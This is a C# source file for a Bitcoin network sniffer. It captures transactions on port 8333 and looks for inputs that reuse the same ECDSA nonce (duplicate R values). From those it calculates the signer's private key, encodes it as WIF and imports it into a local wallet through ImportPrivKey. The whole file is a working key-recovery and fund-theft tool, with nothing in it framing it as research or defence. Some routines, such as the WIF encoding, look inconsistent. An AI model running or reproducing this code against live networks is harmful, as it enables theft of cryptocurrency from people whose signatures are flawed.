using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using BitcoinLib.Services.Coins.Bitcoin;
using Open.Sniffer;
using Org.BouncyCastle.Math;

namespace BitcoinTxWatcher
{
    class BtcSniffer : SnifferBase
    {
        private readonly SHA256 _sha256 = SHA256.Create();
        private readonly IBitcoinService _btc = new BitcoinService();

        public BtcSniffer(IPAddress bindTo) 
            : base(bindTo)
        {
        }

        protected override void ProcessPacket(ProtocolType protocolType, object packet)
        {
            if (protocolType != ProtocolType.Tcp) return;

            var tcpHeader = (TcpHeader) packet;
            if (tcpHeader.DestinationPort != 8333 && tcpHeader.SourcePort != 8333) return;
            if(tcpHeader.MessageLength == 0) return;

            try
            {
                var btcHeader = new BtcHeader(tcpHeader);
                if(! btcHeader.Command.StartsWith("tx")) return;

                var tx = ParseTx(btcHeader.Payload);
                ProcessTransaction(tx);
                Console.WriteLine("{0} Inputs", tx.Inputs.Count);
                var i = 0;
                foreach (var input in tx.Inputs)
                {
                    Console.WriteLine("  ({0}) {1}", i, input.PublicKey.ToHex());
                    Console.WriteLine("     R: {0}", input.R.ToString(16));
                    Console.WriteLine("     M: {0}", input.M.ToString(16));
                    Console.WriteLine("     S: {0}", input.S.ToString(16));
                    i++;
                }
                Console.WriteLine("{0} Outputs", tx.Outputs.Count);
                i = 0;
                foreach (var output in tx.Outputs)
                {
                    Console.WriteLine("  ({0})", i);
                    Console.WriteLine("     Satoshies: {0}", output.Value / 100000000.0);
                    Console.WriteLine("     Script   : {0}", output.Script.ToHex());
                    i++;
                }
                Console.WriteLine("---------------------------------------------------------");
            }
            catch
            {
                    
            }
        }

        private void ProcessTransaction(Tx tx)
        {
            if (tx.Inputs.Count < 2) return;

            for (var i = 0; i < tx.Inputs.Count; i++)
            {
                var vin = tx.Inputs[i];

                using (var memw = new MemoryStream())
                {
                    using (var writer = new BinaryWriter(memw))
                    {
                        writer.Write(tx.Version);
                        writer.Write((byte)tx.Inputs.Count);

                        for (var j = 0; j < tx.Inputs.Count; j++)
                        {
                            var vinj = tx.Inputs[j];

                            writer.Write(vinj.Previous);
                            writer.Write(vinj.PreviousSeq);
                            if (i == j)
                            {
                                var parentTxId = _btc.GetRawTransaction(vin.Previous.Reverse().ToHex(), 0);
                                var parentTx = ParseTx(parentTxId.ToByteArray());
                                var output = parentTx.Outputs[vin.PreviousSeq];
                                writer.Write(output.ScriptLength);
                                writer.Write(output.Script);
                            }
                            else
                            {
                                writer.Write((byte)0);

                            }
                            writer.Write(vinj.Seq);
                        }

                        writer.Write((byte)tx.Outputs.Count);
                        for (int k = 0; k < tx.Outputs.Count; k++)
                        {
                            var tout = tx.Outputs[k];
                            writer.Write(tout.Value);
                            writer.Write(tout.ScriptLength);
                            writer.Write(tout.Script);
                        }
                        writer.Write(tx.Locktime);
                        writer.Write(0x1);

                        var raw = memw.ToArray();
                        var hash = _sha256.ComputeHash(raw);
                        hash = _sha256.ComputeHash(hash);

                        tx.Inputs[i].M = BigIntegerEx.FromByteArray(hash);
                    }
                }

                //Console.Write("{0} => Analizando TxId: {1}", DateTime.Now, txId);

                // Find duplicated R values
                var inputs = tx.Inputs.GroupBy(x => x.R)
                    .Where(x => x.Count() >= 2)
                    .Select(y => y)
                    .ToList();

                if (inputs.Any())
                {
                    var i0 = inputs[0].First();
                    var i1 = inputs[0].Last();

                    var pp = CalculatePrivateKey(i0.M, i1.M, i0.S, i1.S, i0.R);
                    var pkwif = KeyToWIF(pp.ToString(16));
                    Console.WriteLine(" **************************************************************************");
                    Console.WriteLine(" ****   pk: {0}", pkwif);
                    Console.WriteLine(" **************************************************************************");

                    _btc.ImportPrivKey(pkwif, "", false);
                    for (int ii = 0; ii < 150; ii++) Console.Beep();
                }
                Console.WriteLine("");
            }
        }

        private static Tx ParseTx(byte[] rtx)
        {
            return ParseTx(new ArraySegment<byte>(rtx, 0, rtx.Length));
        }


        private static Tx ParseTx(ArraySegment<byte> rtx)
        {
            var tx = new Tx();
            using (var memr = new MemoryStream(rtx.Array, rtx.Offset, rtx.Count))
            {
                using (var reader = new BinaryReader(memr))
                {
                    tx.Version = reader.ReadInt32();
                    var ic = reader.ReadVarInt();
                    tx.Inputs = new List<Input>((int)ic);
                    for (var i = 0; i < ic; i++)
                    {
                        var input = new Input();
                        input.Previous = reader.ReadBytes(32);
                        input.PreviousSeq = reader.ReadInt32();
                        input.ScriptLength = reader.ReadVarInt();
                        input.Script = reader.ReadBytes(3);
                        if (!(input.Script[1] == 0x30 && (input.Script[0] == input.Script[2] + 3)))
                        {
                            throw new Exception();
                        }
                        var vv = reader.ReadByte();
                        input.rawR = reader.ReadStringAsByteArray();
                        vv = reader.ReadByte();
                        input.rawS = reader.ReadStringAsByteArray();
                        input.HashType = reader.ReadByte();
                        input.PublicKey = reader.ReadStringAsByteArray();
                        input.Seq = reader.ReadInt32();
                        tx.Inputs.Add(input);
                    }
                    var oc = reader.ReadVarInt();
                    tx.Outputs = new List<Output>((int)oc);
                    for (int i = 0; i < oc; i++)
                    {
                        var output = new Output();
                        output.Value = reader.ReadInt64();
                        output.ScriptLength = reader.ReadByte();
                        output.Script = reader.ReadBytes(output.ScriptLength);
                        tx.Outputs.Add(output);
                    }
                    tx.Locktime = reader.ReadInt32();
                }
            }
            return tx;
        }

        private static BigInteger CalculatePrivateKey(BigInteger m1, BigInteger m2, BigInteger s1, BigInteger s2, BigInteger r)
        {
            var q = BigInteger.Two.Pow(256).Subtract(new BigInteger("432420386565659656852420866394968145599"));

            var m1m2 = m1.Subtract(m2);
            var s1s2 = s1.Subtract(s2);
            var s1s2_inv = s1s2.ModInverse(q);

            var k = m1m2.Multiply(s1s2_inv).Mod(q);
            var t = s1.Multiply(k).Subtract(m1).Mod(q);

            var prk = t.Multiply(r.ModInverse(q)).Mod(q);
            return prk;
        }


        static string KeyToWIF(string pk)
        {
            var bytes = pk.ToByteArray();

            var hex = bytes.ToHex();
            var step1 = ((hex.Length % 2 == 0 ? "80" : "800") + hex).ToByteArray();

            var sha256 = SHA256.Create();
            step1 = sha256.ComputeHash(step1);
            var step2 = sha256.ComputeHash(step1);

            var buf = new byte[bytes.Length + 5];
            buf[0] = 0x80;
            Buffer.BlockCopy(bytes, 0, buf, 1, bytes.Length);
            Buffer.BlockCopy(step2, 0, buf, bytes.Length + 1, 4);

            return Base58Encoding.Encode(buf);
        }
    }
}